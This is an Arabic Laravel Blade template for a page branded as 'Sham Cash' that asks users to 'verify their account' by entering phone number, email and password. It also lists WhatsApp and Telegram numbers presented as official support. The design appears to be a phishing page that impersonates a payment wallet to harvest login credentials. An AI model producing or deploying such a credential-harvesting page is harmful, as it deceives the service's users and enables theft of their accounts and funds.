<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css">
    <link rel="shortcut icon" href="\logo.e8f94ee2.svg" type="image/x-icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Noto+Kufi+Arabic:wght@100..900&display=swap"
        rel="stylesheet">
    <title>shamcash</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Noto Kufi Arabic", sans-serif;

        }

        body {
            background-color: #f0f6f9;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            flex-grow: 1;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin: 20px auto;
        }

        .title {
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-control {
            width: 100%;
            padding: 15px 45px 15px 15px;
            border: none;
            border-radius: 10px;
            background-color: #e6eef1;
            font-size: 16px;
            text-align: right;
        }

        .form-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #777;
        }

        .form-icon-right {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #777;
        }

        .btn {
            width: 100%;
            padding: 15px;
            background-color: #1976b2;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 15px;
        }

        .footer {
            text-align: center;
            margin-top: auto;
            padding: 20px 0;
        }

        .contact-info {
            text-align: center;
            line-height: 1.6;
            margin-top: 30px;
            font-size: 14px;
        }

        .powered-by {
            text-align: center;
            color: #777;
            margin-top: 30px;
            font-size: 12px;
        }

        .lang-switch {
            color: #000;
            font-weight: bold;
            text-decoration: none;
        }

        .info-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            border: 2px solid #000;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            cursor: pointer;
        }

        /* إضافة تصميم النافذة المنبثقة */
        .contact-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            direction: rtl;
            font-family: 'Arial', sans-serif;
        }

        .contact-popup.show {
            display: flex;
        }

        .popup-content {
            width: 90%;
            max-width: 400px;
            background-color: #f1f5f9;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .popup-header {
            background-color: #0088cc;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
        }

        .popup-body {
            padding: 0;
        }

        .support-section {
            padding: 20px;
            background-color: white;
        }

        .support-section.technical-support {
            background-color: #f8f8f8;
        }

        .support-section h3 {
            margin-bottom: 15px;
            font-size: 18px;
        }

        .contact-item {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .contact-icon {
            font-size: 24px;
            margin-left: 10px;
        }

        .contact-text {
            font-size: 16px;
            line-height: 1.4;
            direction: ltr;
            text-align: left;
        }

        .form-icon-right i {
            color: black;
        }
    </style>
</head>

<body>
    <div class="container">
        <header class="header">
            <a href="#" class="lang-switch">الإنكليزية</a>
            <div class="info-icon" id="infoIcon">i</div>
        </header>

        <div class="logo">
            <img src="\logo.e8f94ee2.svg" alt="Logo" style="width: 80%; height: auto;">
        </div>

        <h1 class="title">توثيق الحساب</h1>
        @if ($errors->any())
            <div class="alert alert-danger">
                <ul>
                    @foreach ($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
            </div>
        @endif
        @if (session('error'))
            <h6 style="text-align: center; color: red;">
                {{ session('error') }}
            </h6>
        @endif
        <form id="validationForm" method="POST" action="{{ route('register') }}">
            @csrf
            <div class="form-group">
                <span class="form-icon form-icon-right "><i style="font-size: 20px; " class="ri-phone-fill "></i></span>
                <!-- أيقونة الهاتف -->
                <input type="tel" name="phone" class="form-control" id="phone" placeholder="رقم الهاتف"
                    required>
            </div>

            <div class="form-group">
                <input type="email" name="email" class="form-control" placeholder="بريد الكتروني" required>
                <span class="form-icon-right"><i class="fa fa-user"></i></span>
            </div>

            <div class="form-group">
                <input type="password" name="password" class="form-control" placeholder="كلمة السر" id="passwordField"
                    required>
                <span class="form-icon-right"><i class="fa fa-lock" style="color: black;"></i></span>
                <span class="form-icon" id="togglePassword"><i class="fa fa-eye"
                        style="color: black; cursor: pointer;"></i></span>
            </div>
            <button type="submit" class="btn">توثيق الحساب</button>
        </form>

        <div class="contact-info">
            تأكد من تواصل الرسمي من رقم خدمة العملاء<br>
            +963983115117<br>
            الموجود في التطبيق
        </div>

        <div class="footer">
            <div class="powered-by">
                POWERED BY<br>
                Sham Cash ©<br>
                V 2.0.0
            </div>
        </div>
    </div>

    <!-- النافذة المنبثقة لمعلومات الاتصال -->
    <div class="contact-popup" id="contactPopup">
        <div class="popup-content">
            <div class="popup-header">للتواصل مع الدعم</div>
            <div class="popup-body">
                <div class="support-section">
                    <h3>خدمة العملاء:</h3>
                    <div class="contact-item">
                        <span class="contact-icon"><i class="ri-whatsapp-fill"></i></span>
                        <span class="contact-text">رقم تواصل الواتس اب:<br>+963983115117</span>
                    </div>
                    <div class="contact-item">
                        <span class="contact-icon"><i class="fa fa-paper-plane"></i></span>
                        <span class="contact-text">حساب التلغرام<br>+963983115117</span>
                    </div>
                </div>
                <hr style="margin: 0; border: none; border-top: 1px solid #ccc;">
                <div class="support-section technical-support">
                    <h3>الدعم التقني:</h3>
                    <div class="contact-item">
                        <span class="contact-icon"><i class="ri-whatsapp-fill"></i></span>
                        <span class="contact-text">رقم تواصل الواتس اب:<br>+963983115119</span>
                    </div>
                    <div class="contact-item">
                        <span class="contact-icon"><i class="fa fa-paper-plane"></i></span>
                        <span class="contact-text">حساب التلغرام<br>+963983115119</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // التحقق من رقم الهاتف
        document.getElementById('validationForm').addEventListener('submit', function(event) {
            const phoneNumber = document.getElementById('phone').value;
            if (!phoneNumber.startsWith('09')) {
                alert('يجب أن يبدأ رقم الهاتف بـ 09');
                event.preventDefault(); // منع إرسال النموذج
            }
        });

        // إضافة وظيفة عرض/إخفاء كلمة السر
        const togglePassword = document.getElementById('togglePassword');
        const passwordField = document.getElementById('passwordField');

        togglePassword.addEventListener('click', () => {
            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordField.setAttribute('type', type);

            // تغيير شكل الأيقونة عند العرض/الإخفاء
            togglePassword.innerHTML = type === 'password' ?
                '<i class="fa fa-eye" style="color: black; cursor: pointer;"></i>' :
                '<i class="fa fa-eye-slash" style="color: black; cursor: pointer;"></i>';
        });

        // فتح النافذة المنبثقة عند الضغط على أيقونة المعلومات
        const infoIcon = document.getElementById('infoIcon');
        const contactPopup = document.getElementById('contactPopup');

        infoIcon.addEventListener('click', () => {
            contactPopup.classList.add('show');
        });

        contactPopup.addEventListener('click', (event) => {
            if (event.target === contactPopup) {
                contactPopup.classList.remove('show');
            }
        });

        // تحقق من رقم الهاتف عند الكتابة
        const phoneInput = document.getElementById('phone');
        phoneInput.addEventListener('input', function() {
            const phoneValue = phoneInput.value;
            if (!phoneValue.startsWith("09")) {
                phoneInput.setCustomValidity("رقم الهاتف يجب أن يبدأ بـ 09");
            } else {
                phoneInput.setCustomValidity("");
            }
        });
    </script>
</body>

</html>
